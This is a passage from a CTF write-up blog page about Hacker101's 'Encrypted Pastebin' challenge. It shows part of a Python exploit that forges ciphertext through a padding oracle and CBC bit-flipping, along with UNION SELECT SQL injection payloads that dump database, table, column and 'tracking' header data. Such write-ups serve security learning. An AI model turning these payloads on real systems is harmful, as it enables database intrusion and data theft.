thread.start()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> thread <span class="keyword">in</span> threads:</span><br><span class="line">            thread.join()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> result:</span><br><span class="line">            j = result[<span class="number">0</span>]</span><br><span class="line">            cur_suf = <span class="string">b&#x27;\x01&#x27;</span> * (<span class="number">16</span> - i) + <span class="built_in">bytes</span>([j]) + xor(suf, <span class="built_in">bytes</span>([i^(i-<span class="number">1</span>)] * (i - <span class="number">1</span>)))</span><br><span class="line">            suf = cur_suf[<span class="number">16</span> - i:]</span><br><span class="line">            cur = xor(suf[<span class="number">0</span>], <span class="built_in">bytes</span>([i]))+cur</span><br><span class="line"><span class="comment">#            print(cur)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> cur</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;https://669099f2c694bc3cf1c1f5ae19016f77.ctf.hacker101.com/?post=&#x27;</span></span><br><span class="line">cur_param = <span class="string">b&#x27;KWJlR2cCCcGYhMBdPSotLiWdHcoNMiYSSTNoRL9zfRTLGTFdFdu9xBxiXc9SJFQ5NEGkB90mbkF-zvdqnoT4X2fQykzaXWCMY7CX3IwyYXRnAAICk4d98bTrUHXRVENpfQ5sANV9fGIDT-eWO4EUD4H2nSL5egynC6TAfEXoRzs92SQLeu7V1JLc06I5-WraCOH38VOdkr-jmQYRZ!cgTQ~~&#x27;</span></span><br><span class="line">cur_param = custom_decode(cur_param)</span><br><span class="line"></span><br><span class="line"><span class="comment"># known value</span></span><br><span class="line">last=cur_param[<span class="number">16</span>:<span class="number">32</span>]</span><br><span class="line">known=xor(cur_param[:<span class="number">16</span>], <span class="string">b&#x27;&#123;&quot;flag&quot;: &quot;^FLAG^&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Brute Forcing init dec value</span></span><br><span class="line"><span class="comment">#print(brute_init(b&#x27;`\x8c\xa9\xb0\xe0cp\xff\x05\xf9&gt;\xe6Q\xfa\xc1\xbf&#x27;))</span></span><br><span class="line"><span class="comment"># len(b&#x27;&#123;&quot;id&quot;: &quot;7 UNION SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database() #&quot;&#125;&#x27;)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">wanted=b&#x27;&#123;&quot;id&quot;: &quot;7 UNION SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database() #&quot;&#125;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># wanted=b&#x27;&#123;&quot;id&quot;:&quot;1&quot;, &quot;meow&quot;:&quot;meow&quot;&#125;&#x27;</span></span><br><span class="line"><span class="comment"># wanted=b&#x27;&#123;&quot;id&quot;:&quot;7 UNION SELECT group_concat(database()), 1&quot;&#125;&#x27;</span></span><br><span class="line"><span class="comment"># wanted=b&#x27;&#123;&quot;id&quot;: &quot;7 UNION SELECT group_concat(table_name), 1 FROM information_schema.tables WHERE table_schema=database()&quot;&#125;&#x27;</span></span><br><span class="line"><span class="comment"># wanted=b&#x27;&#123;&quot;id&quot;:&quot;7 UNION SELECT group_concat(column_name), 1 FROM information_schema.columns WHERE table_name=\&#x27;tracking\&#x27;&quot;&#125;&#x27;</span></span><br><span class="line">wanted=<span class="string">b&#x27;&#123;&quot;id&quot;:&quot;7 UNION SELECT group_concat(headers), 1 FROM tracking&quot;&#125;&#x27;</span></span><br><span class="line">wanted=pad(wanted)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(wanted), wanted)</span><br><span class="line"></span><br><span class="line">payload=last</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(wanted), <span class="number">16</span>, -<span class="number">16</span>):</span><br><span class="line">    payload=xor(known[:<span class="number">16</span>], wanted[i-<span class="number">16</span>:i])+payload</span><br><span class="line">    known=brute_init(payload[:<span class="number">16</span>])+known</span><br><span class="line"></span><br><span class="line">payload=xor(known[:<span class="number">16</span>], wanted[:<span class="number">16</span>])+payload</span><br><span class="line"><span class="built_in">print</span>(custom_encode(payload))</span><br></pre></td></tr></table></figure>

<p><strong>Gaining database names</strong><br><code>&#123;&quot;id&quot;:&quot;7 UNION SELECT group_concat(database()), 1&quot;&#125;</code><br><img src="https://hackmd.io/_uploads/S138jYB5C.png" alt="image"><br><strong>Gaining table names</strong><br><code>&#123;&quot;id&quot;: &quot;7 UNION SELECT group_concat(table_name), 1 FROM information_schema.tables WHERE table_schema=database()&quot;&#125;</code><br><img src="https://hackmd.io/_uploads/ryvKVorc0.png" alt="image"><br><strong>Gaining column names for table tracking</strong><br><code>&#123;&quot;id&quot;:&quot;7 UNION SELECT group_concat(column_name), 1 FROM information_schema.columns WHERE table_name=&#39;tracking&#39;&quot;&#125;</code><br><img src="https://hackmd.io/_uploads/rykzKsHcC.png" alt="image"><br><strong>Extract Header datas from table tracking</strong><br><code>&#123;&quot;id&quot;:&quot;7 UNION SELECT group_concat(headers), 1 FROM tracking&quot;&#125;</code><br><img src="https://hackmd.io/_uploads/rJlqcsBcC.png" alt="image"></p>
<p>And finally, go to the dumped url from table ‘tracking’ and get the last flag!  </p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a href="/search/">Search</a></li>
        
          <li><a href="/tags/">tags</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-all"><span class="toc-number">1.</span> <span class="toc-text">Before all</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Write-Up"><span class="toc-number">2.</span> <span class="toc-text">Write Up</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RECON"><span class="toc-number">3.</span> <span class="toc-text">RECON</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Padding-Oracle"><span class="toc-number">4.</span> <span class="toc-text">Padding Oracle</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bit-flipping"><span class="toc-number">5.</span> <span class="toc-text">Bit flipping</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-Injection"><span class="toc-number">6.</span> <span class="toc-text">SQL Injection</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2024/08/11/hacker101ctf-enc-pastebin/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2024/08/11/hacker101ctf-enc-pastebin/&text=Encrypted Pastebin on Hacker101CTF"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2024/08/11/hacker101ctf-enc-pastebin/&title=Encrypted Pastebin on Hacker101CTF"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2024/08/11/hacker101ctf-enc-pastebin/&is_video=false&description=Encrypted Pastebin on Hacker101CTF"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Encrypted Pastebin on Hacker101CTF&body=Check out this article: http://wha13.github.io/2024/08/11/hacker101ctf-enc-pastebin/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2024/08/11/hacker101ctf-enc-pastebin/&title=Encrypted Pastebin on Hacker101CTF"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2024/08/11/hacker101ctf-enc-pastebin/&title=Encrypted Pastebin on Hacker101CTF"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2024/08/11/hacker101ctf-enc-pastebin/&title=Encrypted Pastebin on Hacker101CTF"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2024/08/11/hacker101ctf-enc-pastebin/&title=Encrypted Pastebin on Hacker101CTF"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2024/08/11/hacker101ctf-enc-pastebin/&name=Encrypted Pastebin on Hacker101CTF&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2024/08/11/hacker101ctf-enc-pastebin/&t=Encrypted Pastebin on Hacker101CTF"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2023-2025
    William Lin
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/tags/">tags</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
